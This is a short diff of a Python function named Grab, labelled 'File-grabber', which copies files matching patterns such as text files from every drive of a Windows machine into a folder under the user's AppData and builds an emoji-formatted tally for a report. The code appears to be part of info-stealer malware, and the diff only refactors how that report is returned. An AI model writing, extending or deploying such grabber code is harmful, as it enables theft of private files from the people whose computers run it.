@@ -35,7 +35,8 @@ def Copy(fileList, path, extension, count):
             Log(f"{fname[:-len(extension)]}___{count}{extension} --> {e}")
     return count
 
-def Grab(data):
+def Grab():
+    msgInfo = ""
     chdir("C:")
     try:
         mainPath = environ['USERPROFILE'] + sep + r'AppData\Local'
@@ -45,7 +46,7 @@ def Grab(data):
             pass
         try:
             Log("===========File-grabber===========")
-            data.append("\n\n**📁File-grabber📁**")
+            msgInfo +="\n\n\n**📁File-grabber📁**"
 
             filesGrab = [
                 ["**\*.txt", 0],
@@ -66,9 +67,9 @@ def Grab(data):
                         except Exception as e:
                             Log(drive+" copy "+e)
             for i in range(len(filesGrab)):
-                data.append(f"\n∟📄files{filesGrab[i][0][4:]}: {filesGrab[i][1]}")
-            return data
+                msgInfo +=f"\n∟📄files{filesGrab[i][0][4:]}: {filesGrab[i][1]}"
+            return msgInfo
         except:
-            return data
+            return msgInfo
     except:
-            return data
+            return msgInfo
